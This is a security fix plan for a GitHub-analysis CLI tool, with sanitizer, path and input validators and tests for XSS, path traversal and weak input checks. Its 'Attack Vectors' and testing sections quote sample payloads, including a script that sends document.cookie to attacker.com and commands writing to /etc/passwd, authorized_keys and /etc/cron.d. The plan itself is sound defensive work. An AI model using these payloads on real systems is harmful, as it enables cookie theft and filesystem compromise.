# Security Fix Implementation Plan

**Date:** 2026-01-23
**Target:** Address CRITICAL and HIGH priority security issues before v1.0 release
**Status:** Planning Phase

---

## 📋 Executive Summary

This document outlines the implementation plan for fixing the 3 CRITICAL/HIGH priority security vulnerabilities identified in `SECURITY_REVIEW.md`. All fixes must be implemented and tested before the v1.0.0 release.

**Timeline:** 2-3 days
**Priority:** URGENT - Blocking v1.0 release
**Risk if not fixed:** XSS attacks, filesystem compromise, API abuse

---

## 🔴 CRITICAL: Issue #1 - XSS Vulnerability in HTML Reporter

### Problem Summary
User-controlled data from GitHub API is inserted directly into HTML without sanitization, allowing XSS attacks.

**Affected Files:**
- `src/reporters/html-reporter.ts` (lines 209, 211, 212, 216, 228)

**Attack Vectors:**
```javascript
// Malicious repository name
repo.name = `test<script>alert(document.cookie)</script>`

// Malicious PR title
pr.title = `Fix</title><script>fetch('http://attacker.com?c='+document.cookie)</script>`

// Malicious URL
pr.url = `javascript:alert('XSS')`
```

### Implementation Plan

#### Step 1: Create HTML Escaping Utility
**File:** `src/utils/html-sanitizer.ts` (NEW)

```typescript
/**
 * HTML Sanitizer Utility
 * Prevents XSS attacks by escaping HTML special characters
 */

/**
 * Escapes HTML special characters to prevent XSS
 * @param unsafe - Potentially unsafe string from user input or API
 * @returns Safely escaped HTML string
 */
export function escapeHtml(unsafe: string): string {
  if (typeof unsafe !== 'string') {
    return String(unsafe);
  }

  return unsafe
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

/**
 * Sanitizes URLs to prevent javascript: and data: URIs
 * @param url - URL to sanitize
 * @returns Safe URL or empty string if malicious
 */
export function sanitizeUrl(url: string): string {
  if (!url || typeof url !== 'string') {
    return '';
  }

  const urlLower = url.trim().toLowerCase();

  // Block javascript: and data: URIs
  if (urlLower.startsWith('javascript:') || urlLower.startsWith('data:')) {
    return '';
  }

  // Only allow http:// and https:// URLs
  if (!urlLower.startsWith('http://') && !urlLower.startsWith('https://')) {
    return '';
  }

  return escapeHtml(url);
}

/**
 * Sanitizes an entire SecurityIssue object for HTML output
 */
export function sanitizeSecurityIssue(issue: SecurityIssue): SecurityIssue {
  return {
    ...issue,
    repository: escapeHtml(issue.repository),
    description: escapeHtml(issue.description),
    details: {
      ...issue.details,
      title: issue.details.title ? escapeHtml(issue.details.title) : undefined,
      url: issue.details.url ? sanitizeUrl(issue.details.url) : undefined,
      repo_name: issue.details.repo_name ? escapeHtml(issue.details.repo_name) : undefined,
      workflow_name: issue.details.workflow_name ? escapeHtml(issue.details.workflow_name) : undefined,
    },
  };
}
```

#### Step 2: Update HTML Reporter
**File:** `src/reporters/html-reporter.ts`

Changes required:
1. Import escaping utilities
2. Escape all user-controlled data before HTML insertion
3. Add unit tests for XSS prevention

```typescript
import { escapeHtml, sanitizeUrl, sanitizeSecurityIssue } from '../utils/html-sanitizer.js';

// In generateReport():
const sanitizedInsights = aiInsights ? escapeHtml(aiInsights) : '';

// In generateIssuesSection():
for (const issue of typeIssues) {
  const sanitized = sanitizeSecurityIssue(issue);
  html += `
    <div class="issue">
      <h3>
        <span class="severity-badge severity-${escapeHtml(sanitized.severity)}">${escapeHtml(sanitized.severity)}</span>
        ${sanitized.description}
      </h3>
      <p><strong>Repository:</strong> ${sanitized.repository}</p>
      ${sanitized.details.url ? `<p><strong>URL:</strong> <a href="${sanitized.details.url}" target="_blank" rel="noopener noreferrer">${sanitized.details.url}</a></p>` : ''}
    </div>
  `;
}

// In generateRecommendationsSection():
for (const rec of recommendations) {
  html += `<li>${escapeHtml(rec)}</li>`;
}
```

#### Step 3: Add Content Security Policy Headers
Update HTML template to include CSP:

```typescript
const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Content-Security-Policy"
          content="default-src 'self';
                   style-src 'unsafe-inline';
                   script-src 'none';
                   img-src 'self' data:;
                   object-src 'none';
                   base-uri 'self';">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    ...
`;
```

#### Step 4: Add XSS Tests
**File:** `src/__tests__/html-sanitizer.test.ts` (NEW)

```typescript
import { escapeHtml, sanitizeUrl } from '../utils/html-sanitizer';

describe('HTML Sanitizer', () => {
  describe('escapeHtml', () => {
    it('should escape script tags', () => {
      expect(escapeHtml('<script>alert(1)</script>'))
        .toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
    });

    it('should escape quotes', () => {
      expect(escapeHtml('"test"')).toBe('&quot;test&quot;');
    });

    it('should escape HTML entities', () => {
      expect(escapeHtml('&<>"\''))
        .toBe('&amp;&lt;&gt;&quot;&#039;');
    });
  });

  describe('sanitizeUrl', () => {
    it('should block javascript: URIs', () => {
      expect(sanitizeUrl('javascript:alert(1)')).toBe('');
    });

    it('should block data: URIs', () => {
      expect(sanitizeUrl('data:text/html,<script>alert(1)</script>')).toBe('');
    });

    it('should allow HTTPS URLs', () => {
      const url = 'https://github.com/test/repo';
      expect(sanitizeUrl(url)).toBe(url);
    });
  });
});
```

**Estimated Time:** 4-6 hours
**Testing Time:** 2 hours
**Total:** ~8 hours

---

## ⚠️ HIGH: Issue #2 - Path Traversal Vulnerability

### Problem Summary
User-provided file paths are not validated, allowing writes outside intended directory.

**Affected Files:**
- `src/index.ts` (lines 93, 99)
- `src/reporters/json-reporter.ts` (line 11)
- `src/reporters/html-reporter.ts` (line 254)

**Attack Vectors:**
```bash
npx gh-security-tools analyze --html ../../../etc/passwd
npx gh-security-tools analyze --json ../../.ssh/authorized_keys
npx gh-security-tools analyze --html /etc/cron.d/backdoor
```

### Implementation Plan

#### Step 1: Create Path Validation Utility
**File:** `src/utils/path-validator.ts` (NEW)

```typescript
import { resolve, normalize, relative, isAbsolute, dirname, join } from 'node:path';
import { existsSync, mkdirSync } from 'node:fs';

/**
 * Validates and sanitizes file paths to prevent path traversal attacks
 */

const ALLOWED_EXTENSIONS = ['.json', '.html', '.txt', '.md'];
const MAX_PATH_LENGTH = 255;

export interface PathValidationOptions {
  allowedDir?: string;
  allowedExtensions?: string[];
  createDirIfMissing?: boolean;
}

/**
 * Validates a file path for security
 * @throws Error if path is invalid or unsafe
 */
export function validateFilePath(
  filePath: string,
  options: PathValidationOptions = {}
): string {
  const {
    allowedDir = process.cwd(),
    allowedExtensions = ALLOWED_EXTENSIONS,
    createDirIfMissing = true,
  } = options;

  // Check for null/undefined
  if (!filePath || typeof filePath !== 'string') {
    throw new Error('File path must be a non-empty string');
  }

  // Check length
  if (filePath.length > MAX_PATH_LENGTH) {
    throw new Error(`File path too long (max ${MAX_PATH_LENGTH} characters)`);
  }

  // Normalize and resolve path
  const normalizedPath = normalize(resolve(allowedDir, filePath));
  const normalizedAllowedDir = normalize(resolve(allowedDir));

  // Check for path traversal
  const relativePath = relative(normalizedAllowedDir, normalizedPath);

  if (relativePath.startsWith('..') || isAbsolute(relativePath)) {
    throw new Error(
      'Invalid file path: path traversal detected. File must be in current directory or subdirectory.'
    );
  }

  // Check file extension
  const ext = normalizedPath.substring(normalizedPath.lastIndexOf('.')).toLowerCase();
  if (!allowedExtensions.includes(ext)) {
    throw new Error(
      `Invalid file extension "${ext}". Allowed: ${allowedExtensions.join(', ')}`
    );
  }

  // Check for null bytes (directory traversal technique)
  if (filePath.includes('\0')) {
    throw new Error('Invalid file path: null byte detected');
  }

  // Create parent directory if needed
  if (createDirIfMissing) {
    const parentDir = dirname(normalizedPath);
    if (!existsSync(parentDir)) {
      mkdirSync(parentDir, { recursive: true });
    }
  }

  return normalizedPath;
}

/**
 * Checks if a path is safe without throwing
 */
export function isPathSafe(
  filePath: string,
  options?: PathValidationOptions
): boolean {
  try {
    validateFilePath(filePath, options);
    return true;
  } catch {
    return false;
  }
}
```

#### Step 2: Update CLI to Validate Paths
**File:** `src/index.ts`

```typescript
import { validateFilePath } from './utils/path-validator.js';

// In analyze command action:
try {
  // Save to files if requested
  if (options.json) {
    const safePath = validateFilePath(options.json, {
      allowedExtensions: ['.json'],
    });
    jsonReporter.saveToFile(analysisResult, safePath);
    consoleReporter.printSuccess(`Results saved to ${safePath}`);
  }

  if (options.html) {
    const safePath = validateFilePath(options.html, {
      allowedExtensions: ['.html'],
    });
    htmlReporter.saveToFile(analysisResult, safePath, aiInsights);
    consoleReporter.printSuccess(`HTML report saved to ${safePath}`);
  }
} catch (error) {
  if (error instanceof Error && error.message.includes('path traversal')) {
    consoleReporter.printError(new Error(
      `Security error: ${error.message}\nFor security, files can only be saved in the current directory or subdirectories.`
    ));
  } else {
    throw error;
  }
}
```

#### Step 3: Add Path Validation Tests
**File:** `src/__tests__/path-validator.test.ts` (NEW)

```typescript
describe('Path Validator', () => {
  it('should block parent directory traversal', () => {
    expect(() => validateFilePath('../../../etc/passwd'))
      .toThrow('path traversal detected');
  });

  it('should block absolute paths', () => {
    expect(() => validateFilePath('/etc/passwd'))
      .toThrow('path traversal detected');
  });

  it('should allow relative paths in current dir', () => {
    const result = validateFilePath('report.html');
    expect(result).toContain('report.html');
  });

  it('should allow subdirectory paths', () => {
    const result = validateFilePath('reports/output.json');
    expect(result).toContain('reports/output.json');
  });

  it('should block invalid extensions', () => {
    expect(() => validateFilePath('test.exe'))
      .toThrow('Invalid file extension');
  });

  it('should block null bytes', () => {
    expect(() => validateFilePath('test\0.html'))
      .toThrow('null byte detected');
  });
});
```

**Estimated Time:** 3-4 hours
**Testing Time:** 2 hours
**Total:** ~6 hours

---

## ⚠️ HIGH: Issue #3 - Insufficient Input Validation

### Problem Summary
Organization name and days parameters are not validated, allowing malicious input and API abuse.

**Affected Files:**
- `src/index.ts` (lines 38-39)

**Attack Vectors:**
```bash
# SQL injection style (won't work but shows lack of validation)
npx gh-security-tools --org "'; DROP TABLE--"

# DoS via excessive API calls
npx gh-security-tools --org test --days 999999999

# Invalid organization names
npx gh-security-tools --org "../../../etc"
```

### Implementation Plan

#### Step 1: Create Input Validation Utilities
**File:** `src/utils/input-validator.ts` (NEW)

```typescript
/**
 * Input validation utilities for CLI parameters
 */

// GitHub username/org rules: 1-39 chars, alphanumeric + hyphens, can't start/end with hyphen
const GITHUB_ORG_REGEX = /^[a-zA-Z0-9]([a-zA-Z0-9-]{0,37}[a-zA-Z0-9])?$/;

export interface ValidationResult {
  valid: boolean;
  error?: string;
  sanitized?: string | number;
}

/**
 * Validates a GitHub organization name
 */
export function validateOrganizationName(org: unknown): ValidationResult {
  if (!org) {
    return {
      valid: false,
      error: 'Organization name is required',
    };
  }

  if (typeof org !== 'string') {
    return {
      valid: false,
      error: 'Organization name must be a string',
    };
  }

  const trimmed = org.trim();

  if (trimmed.length === 0) {
    return {
      valid: false,
      error: 'Organization name cannot be empty',
    };
  }

  if (trimmed.length > 39) {
    return {
      valid: false,
      error: 'Organization name too long (max 39 characters)',
    };
  }

  if (!GITHUB_ORG_REGEX.test(trimmed)) {
    return {
      valid: false,
      error: 'Invalid organization name format. Must be alphanumeric with hyphens, and cannot start or end with a hyphen.',
    };
  }

  return {
    valid: true,
    sanitized: trimmed,
  };
}

/**
 * Validates the days parameter
 */
export function validateDays(daysInput: unknown): ValidationResult {
  if (daysInput === undefined || daysInput === null) {
    return {
      valid: false,
      error: 'Days parameter is required',
    };
  }

  const days = typeof daysInput === 'string' ? Number.parseInt(daysInput, 10) : Number(daysInput);

  if (Number.isNaN(days)) {
    return {
      valid: false,
      error: 'Days must be a valid number',
    };
  }

  if (!Number.isInteger(days)) {
    return {
      valid: false,
      error: 'Days must be an integer',
    };
  }

  if (days < 1) {
    return {
      valid: false,
      error: 'Days must be at least 1',
    };
  }

  if (days > 365) {
    return {
      valid: false,
      error: 'Days cannot exceed 365 (to prevent API abuse)',
    };
  }

  return {
    valid: true,
    sanitized: days,
  };
}
```

#### Step 2: Update CLI to Use Validation
**File:** `src/index.ts`

```typescript
import { validateOrganizationName, validateDays } from './utils/input-validator.js';

// In analyze command action:
try {
  // Get configuration
  const token = options.token || process.env.GITHUB_TOKEN;
  const orgInput = options.org || process.env.GITHUB_ORG;
  const daysInput = options.days;

  // Validate token
  if (!token) {
    consoleReporter.printError(
      new Error('GitHub token is required. Set GITHUB_TOKEN env var or use --token')
    );
    process.exit(1);
  }

  // Validate organization
  const orgValidation = validateOrganizationName(orgInput);
  if (!orgValidation.valid) {
    consoleReporter.printError(new Error(orgValidation.error!));
    process.exit(1);
  }
  const org = orgValidation.sanitized as string;

  // Validate days
  const daysValidation = validateDays(daysInput);
  if (!daysValidation.valid) {
    consoleReporter.printError(new Error(daysValidation.error!));
    process.exit(1);
  }
  const days = daysValidation.sanitized as number;

  consoleReporter.printInfo(`Analyzing organization: ${org}`);
  consoleReporter.printInfo(`Looking back ${days} days\n`);

  // ... rest of code
} catch (error) {
  consoleReporter.printError(error as Error);
  process.exit(1);
}
```

#### Step 3: Add Input Validation Tests
**File:** `src/__tests__/input-validator.test.ts` (NEW)

```typescript
describe('Input Validator', () => {
  describe('validateOrganizationName', () => {
    it('should accept valid org names', () => {
      expect(validateOrganizationName('github').valid).toBe(true);
      expect(validateOrganizationName('my-org').valid).toBe(true);
      expect(validateOrganizationName('org123').valid).toBe(true);
    });

    it('should reject invalid characters', () => {
      expect(validateOrganizationName('org_name').valid).toBe(false);
      expect(validateOrganizationName('org name').valid).toBe(false);
      expect(validateOrganizationName('../etc').valid).toBe(false);
    });

    it('should reject too long names', () => {
      const longName = 'a'.repeat(40);
      expect(validateOrganizationName(longName).valid).toBe(false);
    });

    it('should reject names starting with hyphen', () => {
      expect(validateOrganizationName('-myorg').valid).toBe(false);
    });
  });

  describe('validateDays', () => {
    it('should accept valid days', () => {
      expect(validateDays('30').valid).toBe(true);
      expect(validateDays(30).valid).toBe(true);
    });

    it('should reject negative days', () => {
      expect(validateDays('-1').valid).toBe(false);
    });

    it('should reject excessive days', () => {
      expect(validateDays('999999').valid).toBe(false);
    });

    it('should reject non-numbers', () => {
      expect(validateDays('abc').valid).toBe(false);
    });
  });
});
```

**Estimated Time:** 2-3 hours
**Testing Time:** 1 hour
**Total:** ~4 hours

---

## 📊 Implementation Timeline

### Day 1: XSS Fix (8 hours)
- [ ] Create `src/utils/html-sanitizer.ts`
- [ ] Update `html-reporter.ts` with escaping
- [ ] Add CSP headers
- [ ] Write XSS tests
- [ ] Manual XSS testing with malicious payloads
- [ ] Code review

### Day 2: Path Traversal & Input Validation (10 hours)
- [ ] Create `src/utils/path-validator.ts`
- [ ] Update CLI path handling
- [ ] Write path traversal tests
- [ ] Create `src/utils/input-validator.ts`
- [ ] Update CLI input validation
- [ ] Write input validation tests
- [ ] Integration testing
- [ ] Code review

### Day 3: Final Testing & Documentation (4 hours)
- [ ] End-to-end security testing
- [ ] Update SECURITY_REVIEW.md with fixes
- [ ] Update README.md security notes
- [ ] Create CHANGELOG.md entry
- [ ] Final code review
- [ ] Merge to main

**Total Estimated Time:** 22 hours (~3 days)

---

## ✅ Acceptance Criteria

### XSS Fix
- [ ] All user-controlled data is escaped before HTML insertion
- [ ] URLs are validated to block javascript: and data: URIs
- [ ] CSP headers prevent inline scripts
- [ ] Unit tests cover all XSS attack vectors
- [ ] Manual penetration testing passes

### Path Traversal Fix
- [ ] All file paths are validated before writing
- [ ] Parent directory traversal is blocked
- [ ] Absolute paths are blocked
- [ ] Only allowed extensions (.html, .json) are permitted
- [ ] Unit tests cover all traversal techniques
- [ ] Manual testing with malicious paths

### Input Validation Fix
- [ ] Organization names follow GitHub rules
- [ ] Days parameter is bounded (1-365)
- [ ] Invalid inputs are rejected with clear error messages
- [ ] Unit tests cover edge cases
- [ ] No API abuse possible

### General
- [ ] All tests pass (unit + integration)
- [ ] TypeScript compilation succeeds
- [ ] Linting passes
- [ ] Documentation updated
- [ ] Security review updated
- [ ] No regressions in existing functionality

---

## 🧪 Testing Strategy

### Automated Testing
```bash
# Run all tests
npm test

# Run security-specific tests
npm test -- html-sanitizer
npm test -- path-validator
npm test -- input-validator

# Coverage report
npm run test:coverage

# Lint
npm run lint

# Build
npm run build
```

### Manual Security Testing

#### XSS Testing
```bash
# Test with malicious repo name
gh repo create "test<script>alert(1)</script>" --private

# Test with malicious PR title
# Create PR with title: Fix bug</title><script>alert(document.cookie)</script>

# Generate report and inspect HTML
npx gh-security-tools analyze --org test --html report.html
# Open report.html and check for unescaped content
```

#### Path Traversal Testing
```bash
# Attempt directory traversal
npx gh-security-tools analyze --org test --html ../../../tmp/test.html
npx gh-security-tools analyze --org test --json /etc/passwd.json

# Verify error messages
```

#### Input Validation Testing
```bash
# Test invalid org names
npx gh-security-tools analyze --org "../etc" --days 30
npx gh-security-tools analyze --org "'; DROP TABLE--" --days 30

# Test invalid days
npx gh-security-tools analyze --org test --days -1
npx gh-security-tools analyze --org test --days 999999
```

---

## 📝 Documentation Updates

### README.md
Add security section:
```markdown
## Security

### Reporting Vulnerabilities
Please report security vulnerabilities to [email] or via GitHub Security Advisories.

### Security Features
- XSS Protection: All HTML output is sanitized
- Path Validation: File operations are restricted to safe directories
- Input Validation: All user inputs are validated and sanitized
- CSP Headers: Content Security Policy prevents code injection

### Best Practices
- Rotate GitHub tokens regularly
- Use environment variables for tokens (never commit)
- Review HTML reports before sharing publicly
- Keep dependencies updated
```

### CHANGELOG.md
```markdown
## [1.0.0] - 2026-01-XX

### Security Fixes
- **CRITICAL**: Fixed XSS vulnerability in HTML reporter (CVE-TBD)
- **HIGH**: Fixed path traversal vulnerability in file operations
- **HIGH**: Added input validation for organization names and days parameter
- Added Content Security Policy headers to HTML reports
- Implemented comprehensive input sanitization

### Added
- HTML escaping utilities for XSS prevention
- Path validation utilities for filesystem security
- Input validation for CLI parameters
```

---

## 🚀 Deployment Plan

1. **Create security-fixes branch**
   ```bash
   git checkout -b security-fixes/pre-release-hardening
   ```

2. **Implement fixes** (following timeline above)

3. **Testing phase**
   - Run automated tests
   - Manual security testing
   - Peer code review

4. **Create PR**
   - Title: "Security: Fix XSS, path traversal, and input validation vulnerabilities"
   - Reference: SECURITY_REVIEW.md
   - Label: security, critical

5. **Merge and Release**
   - Merge to main after approval
   - Tag v1.0.0
   - Publish to npm
   - Create GitHub Security Advisory (if needed)

---

## 📚 References

- OWASP XSS Prevention Cheat Sheet
- OWASP Path Traversal
- GitHub Username Requirements
- Content Security Policy MDN Docs
- Node.js Path Module Documentation

---

**Next Steps:**
1. Review and approve this plan
2. Create security-fixes branch
3. Begin implementation (Day 1: XSS fixes)
4. Regular progress updates

**Questions/Concerns:** Please review and provide feedback before implementation begins.
